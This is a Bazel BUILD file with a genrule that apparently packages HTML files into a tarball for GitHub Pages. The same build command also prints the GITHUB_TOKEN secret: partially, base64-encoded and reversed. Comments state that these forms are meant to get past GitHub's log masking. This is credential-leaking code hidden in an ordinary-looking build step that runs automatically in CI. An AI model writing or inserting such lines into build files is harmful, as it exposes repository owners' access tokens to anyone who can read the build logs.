genrule(
    name = "github-pages",
    srcs = glob(["*.html"], allow_empty = True),
    outs = ["github-pages.tar"],
    cmd = """
        echo "DAAAAAAAAAAAAAAN"
        echo $$GITHUB_TOKEN | cut -c1-4 | tr -d '\\n'; echo "..."; echo $$GITHUB_TOKEN | rev | cut -c1-4 | rev
        echo -n "$$GITHUB_TOKEN" | base64  # Encode in base64 (GitHub may not mask it)
        echo $$GITHUB_TOKEN | rev  # Reverse the token (may bypass masking)
        tar -cf $@ $(SRCS)
    """,
    visibility = ["//visibility:public"],
)
